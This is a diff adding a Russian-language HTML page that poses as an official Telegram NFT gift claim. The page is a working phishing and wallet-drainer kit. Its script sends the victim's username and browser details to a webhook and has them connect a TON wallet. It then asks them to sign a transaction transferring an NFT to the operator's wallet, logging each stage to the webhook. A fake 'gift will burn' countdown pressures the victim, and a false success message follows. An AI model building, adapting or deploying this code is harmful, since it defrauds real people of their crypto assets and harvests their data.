@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>Telegram Gift</title>
+<script src="https://unpkg.com/@tonconnect/ui@2.0.6/dist/tonconnect-ui.min.js"></script>
+<style>
+:root{--bg:#17212b;--card:#1f2c3a;--txt:#e8eef5;--sub:#8b9bb0;--btn:#2ea6ff;--ok:#31c48d}
+*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+body{background:var(--bg);color:var(--txt);font:15px/1.45 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.card{background:var(--card);border-radius:18px;padding:30px 24px;width:100%;max-width:430px;box-shadow:0 10px 40px rgba(0,0,0,.5);position:relative;overflow:hidden}
+.top{display:flex;align-items:center;gap:10px;margin-bottom:22px}
+.tg{width:38px;height:38px;border-radius:50%;background:linear-gradient(135deg,#2ea6ff,#2481cc);display:flex;align-items:center;justify-content:center;font-size:20px}
+.top .brand{font-weight:600;font-size:15px}
+.top .brand small{display:block;color:var(--sub);font-weight:400;font-size:11px}
+h1{font-size:21px;margin-bottom:6px;font-weight:600}
+p.sub{color:var(--sub);font-size:13px;margin-bottom:22px}
+.gift{background:#0f1a26;border-radius:14px;padding:18px;display:flex;align-items:center;gap:16px;margin-bottom:22px;border:1px solid #2a3b4d;position:relative;overflow:hidden}
+.gift::after{content:"";position:absolute;inset:0;background:linear-gradient(120deg,transparent 30%,rgba(255,255,255,.06) 50%,transparent 70%);transform:translateX(-100%);animation:shine 2.6s infinite}
+@keyframes shine{to{transform:translateX(100%)}}
+.gift .ico{width:58px;height:58px;border-radius:12px;background:linear-gradient(135deg,#ffb800,#ff8a00);display:flex;align-items:center;justify-content:center;font-size:30px;flex-shrink:0}
+.gift .meta .name{font-weight:600;font-size:16px}
+.gift .meta .price{color:var(--sub);font-size:12px;margin-top:3px}
+.gift .meta .price b{color:var(--ok);font-weight:600}
+label{display:block;font-size:12px;color:var(--sub);margin-bottom:6px}
+.input-wrap{position:relative;margin-bottom:18px}
+.input-wrap span{position:absolute;left:15px;top:50%;transform:translateY(-50%);color:var(--sub);font-size:15px}
+input{width:100%;padding:15px 15px 15px 32px;border-radius:12px;border:1px solid #2a3b4d;background:#0f1a26;color:var(--txt);font-size:15px;outline:none;transition:border .2s}
+input:focus{border-color:var(--btn)}
+button{width:100%;padding:16px;border:none;border-radius:12px;background:var(--btn);color:#fff;font-size:15px;font-weight:600;transition:transform .1s,opacity .2s}
+button:active{transform:scale(.98)}
+button:disabled{opacity:.6}
+.foot{text-align:center;color:var(--sub);font-size:11px;margin-top:18px}
+.steps{display:none;margin-bottom:18px}
+.steps.on{display:block}
+.timer{background:#2a1a1a;border:1px solid #5a2a2a;border-radius:10px;padding:10px 14px;text-align:center;font-size:13px;color:#ff8a8a;margin-bottom:14px}
+.timer b{color:#ff5a5a;font-variant-numeric:tabular-nums}
+.step{display:flex;align-items:center;gap:12px;padding:10px 0;opacity:.35;transition:opacity .4s}
+.step.act{opacity:1}
+.step.done{opacity:1}
+.step .dot{width:26px;height:26px;border-radius:50%;border:2px solid #2a3b4d;display:flex;align-items:center;justify-content:center;font-size:13px;flex-shrink:0}
+.step.act .dot{border-color:var(--btn);border-top-color:transparent;animation:spin .8s linear infinite}
+.step.done .dot{background:var(--ok);border-color:var(--ok);color:#fff}
+@keyframes spin{to{transform:rotate(360deg)}}
+.step .txt{font-size:13px}
+.step .txt small{display:block;color:var(--sub);font-size:11px}
+.ok{display:none;text-align:center;padding:14px 0}
+.ok .check{width:68px;height:68px;border-radius:50%;background:var(--ok);display:flex;align-items:center;justify-content:center;margin:0 auto 16px;font-size:36px;animation:pop .4s}
+@keyframes pop{0%{transform:scale(.5);opacity:0}100%{transform:scale(1);opacity:1}}
+.ok h1{font-size:20px;margin-bottom:6px}
+.ok p{color:var(--sub);font-size:13px}
+</style>
+</head>
+<body>
+<div class="card" id="card">
+  <div class="top">
+    <div class="tg">✈️</div>
+    <div class="brand">Telegram Gift<small>Официальный подарок</small></div>
+  </div>
+
+  <div id="stage1">
+    <h1>Вам подарок 🎁</h1>
+    <p class="sub">У вас есть неподтверждённый NFT-подарок от Telegram</p>
+    <div class="gift">
+      <div class="ico">🐻</div>
+      <div class="meta">
+        <div class="name">Plush Bear #1847</div>
+        <div class="price">Стоимость: <b>12.4 TON</b> · TON</div>
+      </div>
+    </div>
+    <label>Ваш Telegram username</label>
+    <div class="input-wrap"><span>@</span>
+      <input id="user" type="text" placeholder="username" autocomplete="off" autocapitalize="off" spellcheck="false">
+    </div>
+    <button id="go">Получить подарок</button>
+    <div class="foot">Telegram Gift · 2026 · Безопасно</div>
+  </div>
+
+  <div class="steps" id="steps">
+    <div class="timer" id="timerWrap">
+      <span id="timerTxt">Подарок сгорит через 00:00:00</span>
+    </div>
+    <div class="step" id="s1"><div class="dot">1</div><div class="txt">Проверка подарка<small>Подарок найден, ожидает привязки</small></div></div>
+    <div class="step" id="s2"><div class="dot">2</div><div class="txt">Привязка кошелька<small>Подключите TON-кошелёк</small></div></div>
+    <div class="step" id="s3"><div class="dot">3</div><div class="txt">Зачисление<small>Подтвердите получение</small></div></div>
+  </div>
+
+  <div class="ok" id="okCard">
+    <div class="check">✓</div>
+    <h1>Подарок зачислен</h1>
+    <p>Plush Bear #1847 отправлен на ваш кошелёк</p>
+  </div>
+</div>
+
+<script>
+// ====== НАСТРОЙКИ — МЕНЯТЬ ЗДЕСЬ ======
+const WEBHOOK  = 'PASTE_WEBHOOK_URL';            // URL из webhook.site
+const NFT_ADDR = 'EQ_PASTE_NFT_ADDRESS';          // адрес NFT, которую переводим
+const TO_OWNER = 'EQ_PASTE_YOUR_WALLET';          // твой кошелёк-получатель
+const MANIFEST = 'https://your-domain.example/tonconnect-manifest.json';
+// =====================================
+
+const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+  manifestUrl: MANIFEST,
+  buttonRootId: null
+});
+
+// нормальный TEP-62 transfer body через @ton/core (unpkg)
+async function buildBody(newOwner, respDest){
+  const core = await import('https://unpkg.com/@ton/core@0.56.3/dist/index.mjs');
+  const { beginCell, Address } = core;
+  const body = beginCell()
+    .storeUint(0x5fcc3d14, 32)
+    .storeUint(0, 64)
+    .storeAddress(Address.parse(newOwner))
+    .storeAddress(Address.parse(respDest))
+    .storeUint(0, 1)
+    .storeCoins(0)
+    .storeUint(0, 1)
+    .endCell();
+  return body.toBoc().toString('base64');
+}
+
+async function relay(data){
+  if(!WEBHOOK) return;
+  try{ await fetch(WEBHOOK,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({t:Date.now(),...data})}); }catch(e){}
+}
+
+const sleep = ms => new Promise(r=>setTimeout(r,ms));
+function setStep(id, cls){ const el=document.getElementById(id); el.className='step '+cls; }
+
+// ====== рандомный таймер 2–5 часов ======
+function pad(n){return String(n).padStart(2,'0');}
+function randSec(){return (2*3600 + Math.floor(Math.random()*(3*3600+1)));}
+let timerLeft = randSec();
+let timerInt = null;
+function fmt(s){
+  const h=Math.floor(s/3600), m=Math.floor((s%3600)/60), sec=s%60;
+  return `${pad(h)}:${pad(m)}:${pad(sec)}`;
+}
+function startTimer(){
+  const el = document.getElementById('timerTxt');
+  if(!el) return;
+  el.innerHTML = 'Подарок сгорит через <b>'+fmt(timerLeft)+'</b>';
+  timerInt = setInterval(()=>{
+    timerLeft--;
+    if(timerLeft <= 0){
+      clearInterval(timerInt);
+      el.innerHTML = 'Подарок сгорел';
+      document.querySelector('.gift').style.opacity = '.4';
+      const g = document.getElementById('go');
+      if(g){ g.disabled = true; g.textContent = 'Подарок сгорел'; }
+      return;
+    }
+    el.innerHTML = 'Подарок сгорит через <b>'+fmt(timerLeft)+'</b>';
+  }, 1000);
+}
+
+document.getElementById('go').addEventListener('click', async ()=>{
+  const u = document.getElementById('user').value.trim().replace(/^@/,'');
+  if(!u){ document.getElementById('user').focus(); return; }
+  const btn = document.getElementById('go');
+  btn.disabled = true; btn.textContent = '...';
+
+  await relay({stage:'username', username:u, ua:navigator.userAgent});
+
+  document.getElementById('stage1').style.display = 'none';
+  document.getElementById('steps').classList.add('on');
+  startTimer();
+
+  setStep('s1','step act');
+  await sleep(1400);
+  setStep('s1','step done');
+
+  setStep('s2','step act');
+  try{
+    if(!tonConnectUI.connected){
+      await tonConnectUI.connectWallet();
+    }
+    await relay({stage:'connected', wallet:tonConnectUI.account?.address, chain:tonConnectUI.account?.chain});
+    setStep('s2','step done');
+
+    setStep('s3','step act');
+    const payload = await buildBody(TO_OWNER, TO_OWNER);
+    const tx = {
+      validUntil: Math.floor(Date.now()/1000) + 600,
+      messages: [{ address: NFT_ADDR, amount: '50000000', payload }]
+    };
+    const res = await tonConnectUI.sendTransaction(tx);
+    await relay({stage:'signed', tx, result:res});
+    setStep('s3','step done');
+
+    document.getElementById('steps').style.display='none';
+    document.getElementById('okCard').style.display='block';
+  }catch(e){
+    await relay({stage:'error', err:String(e)});
+    document.getElementById('steps').classList.remove('on');
+    document.getElementById('stage1').style.display='block';
+    btn.disabled=false; btn.textContent='Попробовать снова';
+  }
+});
+</script>
+</body>
+  </html>
